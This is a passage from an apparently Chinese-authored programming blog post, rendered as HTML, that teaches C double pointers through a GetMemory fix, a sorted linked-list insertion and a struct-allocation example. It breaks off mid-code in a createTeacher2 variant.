    <content type="html"><![CDATA[<h2 id="Double-pointer"><a href="#Double-pointer" class="headerlink" title="Double pointer"></a>Double pointer</h2><p>Which means the pointer to pointer. Take a look at this program.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetMemory</span><span class="params">(<span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Test</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str = <span class="literal">NULL</span>;</span><br><span class="line">    GetMemory(str);</span><br><span class="line">    <span class="built_in">strcpy</span>(str, <span class="string">"hello world"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If we directly test this program it will be aborted by throwing an exception. As we all know, the arguments are passed to functions by value in C/C++. So it’s clear that the pointer <em>str</em> passed into the function <em>GetMemory</em> is a copy of real <em>str</em>. We can fix this program by using a double pointer.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetMemory</span><span class="params">(<span class="keyword">char</span> **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Test</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str = <span class="literal">NULL</span>;</span><br><span class="line">    GetMemory(&amp;str);</span><br><span class="line">    <span class="built_in">strcpy</span>(str, <span class="string">"hello world\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br></pre></td></tr></table></figure><h2 id="Simplify-code-by-using-pointers"><a href="#Simplify-code-by-using-pointers" class="headerlink" title="Simplify code by using pointers"></a>Simplify code by using pointers</h2><p>Here gives an implement of linked list:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//节点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//关键字</span></span><br><span class="line"><span class="keyword">int</span> key;</span><br><span class="line"><span class="comment">//下一个节点指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; s_node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//头节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s_node</span> *<span class="title">header</span>;</span></span><br><span class="line">&#125; s_list;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list_insert</span><span class="params">(s_list *<span class="built_in">list</span>, <span class="keyword">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">list</span> == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建新节点</span></span><br><span class="line">s_node *n = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(s_node));</span><br><span class="line">n-&gt;key = key;</span><br><span class="line">n-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果链表头为空，表头即为新节点</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">list</span>-&gt;header == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">list</span>-&gt;header = n;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果关键字key小于链表头的key</span></span><br><span class="line"><span class="keyword">if</span> (key &lt; <span class="built_in">list</span>-&gt;header-&gt;key)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//替换新节点为链表头，原表头变为新节点的next</span></span><br><span class="line">n-&gt;next = <span class="built_in">list</span>-&gt;header;</span><br><span class="line"><span class="built_in">list</span>-&gt;header = n;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历链表，保持待比较节点的前一个节点</span></span><br><span class="line">s_node *p = <span class="built_in">list</span>-&gt;header;</span><br><span class="line"><span class="comment">//找到第一个大于新节点key的节点（注意，此时p其实是这个节点的上一个节点）</span></span><br><span class="line"><span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span> &amp;&amp; p-&gt;next-&gt;key &lt; key)</span><br><span class="line">&#123;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//插入新节点</span></span><br><span class="line">n-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next = n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">s_list testlist;</span><br><span class="line">list_insert(&amp;testlist, <span class="number">5</span>);</span><br><span class="line">list_insert(&amp;testlist, <span class="number">8</span>);</span><br><span class="line">list_insert(&amp;testlist, <span class="number">7</span>);</span><br><span class="line">list_insert(&amp;testlist, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We must adjust the relations between members of the linked list properly without the help of pointer. This code can be much briefer in the pointer version.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//节点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//关键字</span></span><br><span class="line"><span class="keyword">int</span> key;</span><br><span class="line"><span class="comment">//下一个节点指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; s_node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//头节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s_node</span> *<span class="title">header</span>;</span></span><br><span class="line">&#125; s_list;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list_insert2</span><span class="params">(s_list *<span class="built_in">list</span>, <span class="keyword">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">list</span> == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建新节点</span></span><br><span class="line">s_node *n = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(s_node));</span><br><span class="line">n-&gt;key = key;</span><br><span class="line">n-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二级指针</span></span><br><span class="line">s_node **p = &amp;<span class="built_in">list</span>-&gt;header;</span><br><span class="line"><span class="comment">//找到第一个大于key的节点</span></span><br><span class="line"><span class="keyword">while</span> ((*p) != <span class="literal">NULL</span> &amp;&amp; (*p)-&gt;key &lt; key)</span><br><span class="line">&#123;</span><br><span class="line">p = &amp;(*p)-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//插入新节点</span></span><br><span class="line">n-&gt;next = *p;</span><br><span class="line">*p = n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">s_list testlist;</span><br><span class="line">list_insert2(&amp;testlist, <span class="number">5</span>);</span><br><span class="line">list_insert2(&amp;testlist, <span class="number">8</span>);</span><br><span class="line">list_insert2(&amp;testlist, <span class="number">7</span>);</span><br><span class="line">list_insert2(&amp;testlist, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It can be clearer by giving a diagram:</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/5-1.png" alt></p><p>Those examples we saw above is easy to understand. Let’s dive in some instances which are a little bit confusing.</p><h2 id="When-to-pass-address"><a href="#When-to-pass-address" class="headerlink" title="When to pass address?"></a>When to pass address?</h2><p>Take a look at this code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mcheck.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> false 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//结构体类型，每个导师有三个学生</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Tea</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *tName; <span class="comment">//导师名字，需要动态分配空间char *====&gt;char</span></span><br><span class="line">    <span class="keyword">char</span> **stu;  <span class="comment">//三个学生，需要动态分配空间，堆区数组</span></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    &#125;Teacher;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在createTeacher中分配空间</span></span><br><span class="line"><span class="comment">//n1 =3; //导师个数</span></span><br><span class="line"><span class="comment">//n2 = 3 //学生</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createTeacher</span><span class="params">(Teacher **p, <span class="keyword">int</span> n1, <span class="keyword">int</span> n2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i,j,k;   <span class="comment">//分配3个Student信息</span></span><br><span class="line">    *p = (Teacher*)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(Teacher)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n1;i++)  <span class="comment">//分配3个导师的地址空间</span></span><br><span class="line">        &#123;</span><br><span class="line">        (*p)[i].tName=(<span class="keyword">char</span> *)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">20</span>);  </span><br><span class="line">        <span class="keyword">if</span> ((*p)[i].tName == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//(*p)-&gt;stu=(char **)malloc (sizeof(char*)*3);</span></span><br><span class="line">    <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;n2;j++)</span><br><span class="line">        &#123;</span><br><span class="line">         (*p)[j].stu=(<span class="keyword">char</span> **)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="keyword">char</span>*)*<span class="number">3</span>);</span><br><span class="line">         <span class="keyword">if</span> ((*p)[j].stu == <span class="literal">NULL</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">for</span> (k=<span class="number">0</span>;k&lt;<span class="number">3</span>;k++)</span><br><span class="line">         &#123;</span><br><span class="line">         (*p)[j].stu[k]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">20</span>);</span><br><span class="line">         <span class="keyword">if</span> ((*p)[j].stu[k] == <span class="literal">NULL</span>)</span><br><span class="line">             &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//给成员赋值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initTeacher</span><span class="params">(Teacher *p, <span class="keyword">int</span> n1, <span class="keyword">int</span> n2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> i,j,k=<span class="number">0</span>;  <span class="comment">//</span></span><br><span class="line">      <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">"error\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//n1 =3; //导师个数</span></span><br><span class="line">      <span class="comment">//n2 = 3 //学生</span></span><br><span class="line">     <span class="built_in">puts</span> (<span class="string">"-----导师赋值------"</span>);</span><br><span class="line">     <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n1;i++)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">char</span> *buf[]=&#123;<span class="string">"王教授"</span>,<span class="string">"陆教授"</span>,<span class="string">"田导师"</span>&#125;;</span><br><span class="line">        p[i].age=<span class="number">22</span>+i;</span><br><span class="line">        <span class="comment">//printf ("%d",p[i].age);</span></span><br><span class="line">        <span class="built_in">strcpy</span> (p[i].tName,buf[i]);</span><br><span class="line">    <span class="comment">//  printf ("%s",p[i].tName);</span></span><br><span class="line">        <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;n2;j++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">char</span> *arr[]=&#123;<span class="string">"小黎"</span>,<span class="string">"小田"</span>,<span class="string">"小张"</span>,<span class="string">"小王"</span>,<span class="string">"小胡"</span>,<span class="string">"小范"</span>,</span><br><span class="line">              <span class="string">"小杨"</span>,<span class="string">"小石"</span>,<span class="string">"小柯"</span>&#125;;</span><br><span class="line">          <span class="built_in">strcpy</span> (p[i].stu[j],arr[k]);</span><br><span class="line">          ++k;</span><br><span class="line">        <span class="comment">//  printf ("%s\n",p[i].stu[j]);</span></span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印结构体成员信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printTeacher</span><span class="params">(Teacher *p, <span class="keyword">int</span> n1, <span class="keyword">int</span> n2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> i,j;</span><br><span class="line">      <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">       <span class="built_in">printf</span> (<span class="string">"error\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n1;i++)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">"\t\t%s\n"</span>,p[i].tName);  <span class="comment">//导师</span></span><br><span class="line">        <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;n2;j++)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="built_in">printf</span> (<span class="string">"\t%s"</span>,p[i].stu[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">"\t\t%d\n\n"</span>,p[i].age);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放空间，在函数内部把p赋值为NULL</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeTeacher</span><span class="params">(Teacher **p, <span class="keyword">int</span> n1, <span class="keyword">int</span> n2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> i,j;</span><br><span class="line">       <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="built_in">printf</span> (<span class="string">"Empty\n"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">              <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n1;i++)</span><br><span class="line">              &#123;</span><br><span class="line">                 <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;n2;j++)</span><br><span class="line">                 &#123;</span><br><span class="line">                   <span class="keyword">if</span> ((*p)[i].stu[j]!=<span class="literal">NULL</span>)</span><br><span class="line">                   &#123;</span><br><span class="line">                     <span class="built_in">free</span> ((*p)[i].stu[j]);</span><br><span class="line">                     (*p)[i].stu[j]=<span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">if</span> ((*p)[i].stu!= <span class="literal">NULL</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                   <span class="built_in">free</span> ((*p)[i].stu);</span><br><span class="line">                   (*p)[i].stu=<span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="built_in">free</span> ((*p)[i].tName);</span><br><span class="line">                 (*p)[i].tName=<span class="literal">NULL</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="built_in">free</span> (*p);</span><br><span class="line">              *p=<span class="literal">NULL</span>;</span><br><span class="line">           &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n1 = <span class="number">3</span>; <span class="comment">//导师个数</span></span><br><span class="line">    <span class="keyword">int</span> n2 = <span class="number">3</span>; <span class="comment">//学生</span></span><br><span class="line">    Teacher *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setenv(<span class="string">"MALLOC_TRACE"</span>,<span class="string">"1.txt"</span>,<span class="number">1</span>);</span><br><span class="line">    mtrace();</span><br><span class="line"></span><br><span class="line">    ret = createTeacher(&amp;p, n1, n2);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"createTeacher err:%d\n"</span>, ret);</span><br><span class="line">        <span class="built_in">exit</span> (EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    initTeacher(p, n1, n2); <span class="comment">//给成员赋值</span></span><br><span class="line">    printTeacher(p, n1, n2);</span><br><span class="line">    <span class="comment">//释放空间，在函数内部把p赋值为NULL</span></span><br><span class="line">    freeTeacher(&amp;p, n1, n2);</span><br><span class="line">    <span class="comment">// muntrace();</span></span><br><span class="line">    <span class="comment">// system("pause");</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>I paste the code of function <em>createTeacher2</em> below and here comes the question, can we just simply replace the function <em>createTeacher</em> to <em>createTeacher2</em>?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createTeacher2</span><span class="params">(Teacher *p, <span class="keyword">int</span> n1, <span class="keyword">int</span> n2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i,j,k;   <span class="comment">//分配3个Student信息</span></span><br><span class="line">    p = (Teacher*)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(Teacher)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n1;i++)  <span class="comment">//分配3个导师的地址空间</span></span><br><span class="line">        &#123;</span><br><span class="line">        (p)[i].tName=(<span class="keyword">char</span> *)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">20</span>);  </span><br><span class="line">        <span class="keyword">if</span> ((p)[i].tName == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span 